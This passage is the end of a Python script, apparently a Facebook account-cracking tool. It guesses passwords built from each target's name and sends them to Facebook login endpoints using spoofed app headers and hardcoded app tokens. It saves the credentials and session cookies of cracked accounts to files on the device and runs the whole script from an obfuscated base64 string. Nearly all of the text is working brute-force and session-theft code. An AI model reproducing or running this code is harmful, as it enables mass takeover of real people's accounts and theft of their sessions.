"['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'1792792947455470|f43b4b4c85276992ac952012f8bba674'}
            hedaamr = {
            'Authorization':'OAuth 1792792947455470|f43b4b4c85276992ac952012f8bba674',
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'User-Agent': ua,
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
            }
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f3(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = 'https://b-api.facebook.com/method/auth.login'
            url2 = "https://graph.facebook.com/auth/login"
            po = requests.post(url=url2,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}VEUX {A}➤ {G}{ids} {A}•{G} {pas}')
                os.system("espeak -a 300 \"GTA,  OK,  GTA,  THANKS,  \"")            
                print(f"\033[1;30m[✅] {coki}");linex()
                open('/sdcard/GTA-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}({A}GTA{R}) '+ids+' | '+pas+'{R}')
                open('/sdcard/GTA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M2]==================#
def graph2(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write(f'\r\r{R}({A}GTA-XD{R}) {R}- {R}({A}METHOD-M{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1; Motorola Moto G2 Build/TP1A.223905.061) [FBAN/Orca-Android;FBAV/470.0.0.26.128;FBPN/com.facebook.orca;FBLC/en_US;FBBV/610003012;FBCR/Google Fi;FBMF/Motorola;FBBD/Motorola;FBDV/Moto G2;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_VENOM": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "1792792947455470|f43b4b4c85276992ac952012f8bba674",
            "generate_session_cookies": "1",
            "locale": "ar_AR",
            "client_country_code": "AR",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": generate_facebook_user2_agent(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}VEUX {A}➤ {G}{ids} {A}•{G} {pas}')
                os.system("espeak -a 300 \"GTA,  OK,  GTA,  THANKS,  \"")            
                print(f"\033[1;30m[✅] {coki}");linex()
                open('/sdcard/GTA-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}({A}GTA{R}) '+ids+' | '+pas+'{R}')
                open('/sdcard/GTA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M3]==================#
def graph3(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write(f'\r\r{R}({A}GTA-XD{R}) {R}- {R}({A}METHOD-3{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/1.8.0(Linux; U; Android 13.0;Pixel 7 Pro Build/US8T2OJ9)[FBAN/FB4A;FBAV/116.0.0.75.43FBBV/8501131FBDM/{density=3.0,width=3120,height=1440}FBLC/fr_FRFBRV/3885056FBCR/O2FBMF/PixelFBBD/PixelFBPN/com.facebook.katanaFBDV/Pixel 7 ProFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/1.8.0(Linux; U; Android 12.0;Moto G Power Build/TTC9CRZG)[FBAN/FB4A;FBAV/101.0.0.2.4FBBV/1417357FBDM/{density=3.0,width=464,height=1069}FBLC/pt_BRFBRV/1214343FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PowerFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/2.1.0(Linux; U; Android 12.0;P30 Pro Build/R18R21B8)[FBAN/FB4A;FBAV/104.0.0.48.94FBBV/1973198FBDM/{density=3.0,width=848,height=914}FBLC/pt_BRFBRV/9112718FBCR/O2FBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P30 ProFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            li = ['28']
            li2 = random.choice(li)
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'sw_KE','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            hedaamr = {
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'User-Agent': ua,
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
            }
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f3(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            data = {'adid': adid,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'family_device_id': str(uuid.uuid4()),
            'secure_family_device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'try_num': '1',
            'email': ids,
            'password': pas,
            'method': 'auth.login',
            'generate_session_cookies': '1',
            'sim_serials': "['80973453345210784798']",
            'openid_flow': 'android_login',
            'openid_provider': 'google',
            'openid_emails': "['01710940017']",
            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
            'error_detail_type': 'button_with_disabled',
            'source': 'account_recovery',
            'locale': 'sw_KE',
            'client_country_code': 'KE',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            hedaamr={'Host': 'graph.facebook.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Priority': 'u=3, i',
            'X-Fb-Sim-Hni': '45204',
            'X-Fb-Net-Hni': '45201',
            'X-Fb-Connection-Quality': 'GOOD',
            'Zero-Rated': '0',
            'User-Agent': ua,
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-Fb-Connection-Bandwidth': '24807555',
            'X-Fb-Connection-Type': 'MOBILE.LTE',
            'X-Fb-Device-Group': '5120',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Friendly-Name': 'authenticate',
            'X-Fb-Request-Analytics-Tags': 'unknown',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'Content-Length': '847'}
            url = 'https://b-api.facebook.com/method/auth.login'
            url2 = "https://graph.facebook.com/auth/login"
            po = requests.post(url=url2,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}VEUX {A}➤ {G}{ids} {A}•{G} {pas}')
                #os.system("espeak -a 300 \"VEUX,  OK,  VEUX,  THANKS,  \"")            
                print(f"\033[1;30m[✅] {coki}");linex()
                open('/sdcard/GTA-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}({A}GTA{R}) '+ids+' | '+pas+'{R}')
                open('/sdcard/GTA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M4]==================#
def graph4(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write(f'\r\r{R}({A}GTA-XD{R}) {R}- {R}({A}METHOD-O{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1; Motorola Moto G2 Build/TP1A.223905.061) [FBAN/Orca-Android;FBAV/470.0.0.26.128;FBPN/com.facebook.orca;FBLC/en_US;FBBV/610003012;FBCR/Google Fi;FBMF/Motorola;FBBD/Motorola;FBDV/Moto G2;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_VENOM": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "In_IN",
            "client_country_code": "IN",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f4(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}GTA{A}➤ {G}{ids} {A}•{G} {pas}')
                print(f"\033[1;30m[🙂] {coki}");linex()
                open('/sdcard/GTA-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}({A}GTA{R}) '+ids+' | '+pas+'{R}')
                open('/sdcard/GTA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[END]==================#
mmk()'
exec(B.b64decode(C).decode('utf-8'))
